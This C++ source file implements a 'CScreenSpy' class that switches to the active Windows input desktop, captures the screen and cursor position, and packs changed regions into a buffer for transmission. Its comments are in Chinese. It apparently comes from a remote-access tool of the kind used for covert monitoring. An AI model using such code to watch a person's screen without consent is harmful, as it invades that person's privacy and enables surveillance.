// ScreenSpy.cpp: implementation of the CScreenSpy class.
//
//////////////////////////////////////////////////////////////////////
#include "ScreenSpy.h"
#include "until.h"
#define DEF_STEP	19
#define OFF_SET		24

#define RGB2GRAY(r,g,b) (((b)*117 + (g)*601 + (r)*306) >> 10)
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CScreenSpy::CScreenSpy(int biBitCount, bool bIsGray, UINT nMaxFrameRate)
{
	switch (biBitCount)
	{
	case 1:
	case 4:
	case 8:
	case 16:
	case 32:
		m_biBitCount = biBitCount;
		break;
	default:
		m_biBitCount = 8;
	}
	
	if (!SelectInputWinStation())
	{
		m_hDeskTopWnd = GetDesktopWindow();
		m_hFullDC = GetDC(m_hDeskTopWnd);
	}
	
	m_dwLastCapture	= GetTickCount();
	m_nMaxFrameRate	= nMaxFrameRate;
	m_dwSleep		= 1000 / nMaxFrameRate;
	m_bIsGray		= bIsGray;
    m_nFullWidth	= ::GetSystemMetrics(SM_CXSCREEN);
    m_nFullHeight	= ::GetSystemMetrics(SM_CYSCREEN);
    m_nIncSize		= 32 / m_biBitCount;

	m_nStartLine	= 0;

	m_hFullMemDC	= ::CreateCompatibleDC(m_hFullDC);		
	m_hLineMemDC	= ::CreateCompatibleDC(NULL);
	m_hRectMemDC	= ::CreateCompatibleDC(NULL);
	m_lpvLineBits	= NULL;
	m_lpvFullBits	= NULL;

	m_lpbmi_line	= ConstructBI(m_biBitCount, m_nFullWidth, 1);
	m_lpbmi_full	= ConstructBI(m_biBitCount, m_nFullWidth, m_nFullHeight);
	m_lpbmi_rect	= ConstructBI(m_biBitCount, m_nFullWidth, 1);

	m_hLineBitmap	= ::CreateDIBSection(m_hFullDC, m_lpbmi_line, DIB_RGB_COLORS, &m_lpvLineBits, NULL, NULL);
	m_hFullBitmap	= ::CreateDIBSection(m_hFullDC, m_lpbmi_full, DIB_RGB_COLORS, &m_lpvFullBits, NULL, NULL);

	::SelectObject(m_hFullMemDC, m_hFullBitmap);
	::SelectObject(m_hLineMemDC, m_hLineBitmap);

	::SetRect(&m_changeRect, 0, 0, m_nFullWidth, m_nFullHeight);

	// 足够了
	m_rectBuffer = new BYTE[m_lpbmi_full->bmiHeader.biSizeImage * 2];

	m_rectBufferOffset = 0;
}

CScreenSpy::~CScreenSpy()
{
	::ReleaseDC(m_hDeskTopWnd, m_hFullDC);
	::DeleteDC(m_hLineMemDC);
	::DeleteDC(m_hFullMemDC);
	::DeleteDC(m_hRectMemDC);

	::DeleteObject(m_hLineBitmap);
	::DeleteObject(m_hFullBitmap);

	if (m_rectBuffer)
		delete [] m_rectBuffer;
	delete	m_lpbmi_full;
	delete	m_lpbmi_line;
	delete	m_lpbmi_rect;
}


LPVOID CScreenSpy::getNextScreen(LPDWORD lpdwBytes)
{
	if (lpdwBytes == NULL || m_rectBuffer == NULL)
		return NULL;

	SelectInputWinStation();

	m_rectBufferOffset = 0;

	// 写入光标位置
	POINT	CursorPos;
	GetCursorPos(&CursorPos);
	memcpy(m_rectBuffer + m_rectBufferOffset, (LPBYTE)&CursorPos, sizeof(POINT));
	// rectBuffer 偏移增量
	m_rectBufferOffset += sizeof(POINT);

    LPDWORD p1, p2;
    int j;
	for (int i = m_nStartLine; i < m_nFullHeight; i += DEF_STEP)
    {
		::BitBlt(m_hLineMemDC, 0, 0, m_nFullWidth, 1, m_hFullDC, 0, i, SRCCOPY);
		// 0 是最后一行
		p1 = (PDWORD)((DWORD)m_lpvFullBits + ((m_nFullHeight - 1 - i) * m_nFullWidth * m_biBitCount / 8));
        p2 = (PDWORD)m_lpvLineBits;
        ::SetRect(&m_changeRect, -1, i - DEF_STEP, -1, i + DEF_STEP * 2);
        j = 0;
        while (j < m_nFullWidth)
        {
            if (*p1 != *p2)
            {
                if (m_changeRect.right < 0)
                    m_changeRect.left = j - OFF_SET;
                m_changeRect.right = j + OFF_SET;
            }
            p1++;
            p2++;
            j += m_nIncSize;
        }

        if (m_changeRect.right > -1)
        {
            m_changeRect.left   = max(m_changeRect.left, 0);
            m_changeRect.top    = max(m_changeRect.top, 0);
            m_changeRect.right  = min(m_changeRect.right, m_nFullWidth);
            m_changeRect.bottom = min(m_changeRect.bottom, m_nFullHeight);
			// 复制改变的区域
			CopyRect(&m_changeRect);
            i += DEF_STEP;
        }
    }


    m_nStartLine = (m_nStartLine + 3) % DEF_STEP;

	*lpdwBytes = m_rectBufferOffset;

	// 限制发送帧的速度
	while (GetTickCount() - m_dwLastCapture < m_dwSleep)
		Sleep(1);
	InterlockedExchange((LPLONG)&m_dwLastCapture, GetTickCount());

	return m_rectBuffer;
}

LPBITMAPINFO CScreenSpy::ConstructBI(int biBitCount, int biWidth, int biHeight)
{
/*
biBitCount 为1 (黑白二色图) 、4 (16 色图) 、8 (256 色图) 时由颜色表项数指出颜色表大小
biBitCount 为16 (16 位色图) 、24 (真彩色图, 不支持) 、32 (32 位色图) 时没有颜色表
	*/
	int	color_num = biBitCount <= 8 ? 1 << biBitCount : 0;
	
	int nBISize = sizeof(BITMAPINFOHEADER) + (color_num * sizeof(RGBQUAD));
	BITMAPINFO	*lpbmi = (BITMAPINFO *) new BYTE[nBISize];
	
	BITMAPINFOHEADER	*lpbmih = &(lpbmi->bmiHeader);
	lpbmih->biSize = sizeof(BITMAPINFOHEADER);
	lpbmih->biWidth = biWidth;
	lpbmih->biHeight = biHeight;
	lpbmih->biPlanes = 1;
	lpbmih->biBitCount = biBitCount;
	lpbmih->biCompression = BI_RGB;
	lpbmih->biXPelsPerMeter = 0;
	lpbmih->biYPelsPerMeter = 0;
	lpbmih->biClrUsed = color_num;
	lpbmih->biClrImportant = color_num;
	lpbmih->biSizeImage = (((lpbmih->biWidth * lpbmih->biBitCount + 31) & ~31) >> 3) * lpbmih->biHeight;
	
	if (color_num != 2)
	{
		PALETTEENTRY    *pe = new PALETTEENTRY[color_num];
		HPALETTE        hPal = ::CreateHalftonePalette( NULL );
		::GetPaletteEntries(hPal, 0, color_num, pe);
		::DeleteObject(hPal);
		
		for (int i = 0; i < color_num; i++)
		{
			if (m_bIsGray)
			{
				int color = RGB2GRAY(pe[i].peRed, pe[i].peGreen, pe[i].peBlue);
				lpbmi->bmiColors[i].rgbRed = lpbmi->bmiColors[i].rgbGreen = lpbmi->bmiColors[i].rgbBlue = color;
				lpbmi->bmiColors[i].rgbReserved = pe[i].peFlags;
			}
			else
			{
				lpbmi->bmiColors[i].rgbRed = pe[i].peRed ;
				lpbmi->bmiColors[i].rgbGreen= pe[i].peGreen ;
				lpbmi->bmiColors[i].rgbBlue = pe[i].peBlue ;
				lpbmi->bmiColors[i].rgbReserved = pe[i].peFlags;
			}
		}
		delete pe;
	}
	else // 黑白
	{
		lpbmi->bmiColors[0].rgbRed = 255;
		lpbmi->bmiColors[0].rgbGreen= 255;
		lpbmi->bmiColors[0].rgbBlue = 255;
		lpbmi->bmiColors[0].rgbReserved = 0;

		lpbmi->bmiColors[1].rgbRed = 0;
		lpbmi->bmiColors[1].rgbGreen= 0;
		lpbmi->bmiColors[1].rgbBlue = 0;
		lpbmi->bmiColors[1].rgbReserved = 0;
	}
	return lpbmi;	
}

LPVOID CScreenSpy::getFirstScreen()
{
	::BitBlt(m_hFullMemDC, 0, 0, m_nFullWidth, m_nFullHeight, m_hFullDC, 0, 0, SRCCOPY);
	return m_lpvFullBits;
}

void CScreenSpy::CopyRect( LPRECT lpRect )
{
	int	nRectWidth = lpRect->right - lpRect->left;
	int	nRectHeight = lpRect->bottom - lpRect->top;

	LPVOID	lpvRectBits = NULL;
	// 调整m_lpbmi_rect
	m_lpbmi_rect->bmiHeader.biWidth = nRectWidth;
	m_lpbmi_rect->bmiHeader.biHeight = nRectHeight;
	m_lpbmi_rect->bmiHeader.biSizeImage = (((m_lpbmi_rect->bmiHeader.biWidth * m_lpbmi_rect->bmiHeader.biBitCount + 31) & ~31) >> 3) 
		* m_lpbmi_rect->bmiHeader.biHeight;


	HBITMAP	hRectBitmap = ::CreateDIBSection(m_hFullDC, m_lpbmi_rect, DIB_RGB_COLORS, &lpvRectBits, NULL, NULL);
	::SelectObject(m_hRectMemDC, hRectBitmap);
	::BitBlt(m_hFullMemDC, lpRect->left, lpRect->top, nRectWidth, nRectHeight, m_hFullDC, lpRect->left, lpRect->top, SRCCOPY);
	::BitBlt(m_hRectMemDC, 0, 0, nRectWidth, nRectHeight, m_hFullMemDC, lpRect->left, lpRect->top, SRCCOPY);

	memcpy(m_rectBuffer + m_rectBufferOffset, (LPBYTE)lpRect, sizeof(RECT));
	m_rectBufferOffset += sizeof(RECT);
	memcpy(m_rectBuffer + m_rectBufferOffset, (LPBYTE)lpvRectBits, m_lpbmi_rect->bmiHeader.biSizeImage);
	m_rectBufferOffset += m_lpbmi_rect->bmiHeader.biSizeImage;

	DeleteObject(hRectBitmap);
}

UINT CScreenSpy::getFirstImageSize()
{
	return m_lpbmi_full->bmiHeader.biSizeImage;
}

LPBITMAPINFO CScreenSpy::getBI()
{
	return m_lpbmi_full;
}

UINT CScreenSpy::getBISize()
{
	int	color_num = m_biBitCount <= 8 ? 1 << m_biBitCount : 0;
	
	return sizeof(BITMAPINFOHEADER) + (color_num * sizeof(RGBQUAD));
}

bool CScreenSpy::SelectInputWinStation()
{
	bool bRet = ::SwitchInputDesktop();
	if (bRet)
	{
		ReleaseDC(m_hDeskTopWnd, m_hFullDC);
		m_hDeskTopWnd = GetDesktopWindow();
		m_hFullDC = GetDC(m_hDeskTopWnd);
	}	
	return bRet;	
}